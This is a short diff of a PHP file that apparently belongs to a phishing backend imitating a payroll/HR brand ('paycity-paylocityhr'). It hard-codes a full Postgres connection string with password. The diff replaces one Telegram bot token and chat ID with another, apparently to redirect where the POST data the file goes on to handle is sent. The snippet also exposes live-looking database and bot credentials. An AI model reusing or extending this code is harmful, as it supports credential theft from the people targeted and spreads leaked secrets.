@@ -2,8 +2,9 @@
 $db = pg_connect("host=pg-paycity-paylocityhr0-25.l.aivencloud.com port=19042 dbname=defaultdb user=avnadmin password=AVNS_dOBPgbxmGoJJGAwr-yJ");
 
 // Telegram configuration
-define('TELEGRAM_BOT_TOKEN', '6559948089:AAFPgcZujs2vLPS9Ymvhqz5HOzwaIWoUZa4');
-define('TELEGRAM_CHAT_ID', '1749633126');
+define('TELEGRAM_BOT_TOKEN', '7966448200:AAFQGOoElnlo-I-
+XotL160si319Grxlrb1s');
+define('TELEGRAM_CHAT_ID', '7308655046');
 
 
 if ($_SERVER["REQUEST_METHOD"]=="POST"){
